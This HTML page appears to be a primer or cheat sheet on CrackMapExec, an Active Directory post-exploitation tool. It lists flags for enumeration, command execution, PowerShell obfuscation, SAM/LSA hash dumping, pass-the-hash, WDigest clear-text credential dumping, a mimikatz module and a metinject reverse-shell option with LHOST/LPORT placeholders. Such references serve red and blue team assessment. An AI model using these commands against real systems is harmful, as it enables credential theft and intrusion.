<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>General Primer</title>
</head><body><b>CrackMapExec</b><br/>
CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of &quot;Living off the Land&quot;: abusing built-in Active Directory features/protocols to achieve it's functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.<br/>
<br/>
CME makes heavy use of the Impacket library (developed by @asolino) and the PowerSploit Toolkit (developed by @mattifestation) for working with network protocols and performing a variety of post-exploitation techniques.<br/>
<br/>
Although meant to be used primarily for offensive purposes (e.g. red teams), CME can be used by blue teams as well to assess account privileges, find possible misconfigurations and simulate attack scenarios.<br/>
<br/>
Some Flags:<br/>
CrackMapExec (CME)<br/>
--pass-pol							check password policy before spraying everywhere<br/>
--shares								enumerate all shares<br/>
--lusers								see who's logged into a machine<br/>
--sessions							enumerate active sessions<br/>
--loggedon-users						enumerate logged on users<br/>
--users								enumerate domain users<br/>
--groups								enumerate domain groups<br/>
--local-auth							authenticate locally<br/>
-x									executes commands via WMI<br/>
-X									executes PowerShell command<br/>
--obfs								obfuscate powershell scripts<br/>
--clear-obfscripts						clear all cached obfuscated powershell scripts<br/>
--exec-method						set exec method, ie: smbexec<br/>
--sam								dump SAM hashes<br/>
--lsa								dump LSA hashes<br/>
-H									Flag to pass the hash<br/>
--wdigest enable						Enable the WDigest provider to dump clear-text creds<br/>
-m &lt;module&gt;<br/>
	modules/credentials/mimikatz.py<br/>
-m &lt;module&gt; -o &lt;option&gt;				options for modules<br/>
-m &lt;module&gt; --module-info				module info<br/>
-M metinject -o LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt;	catch with multi/handler<br/>
--spider								share to spider<br/>
--spider-folder							folder to spider<br/>
--content								enable file content searching<br/>
--pattern								pattern to search for in folders, filenames, content</body></html>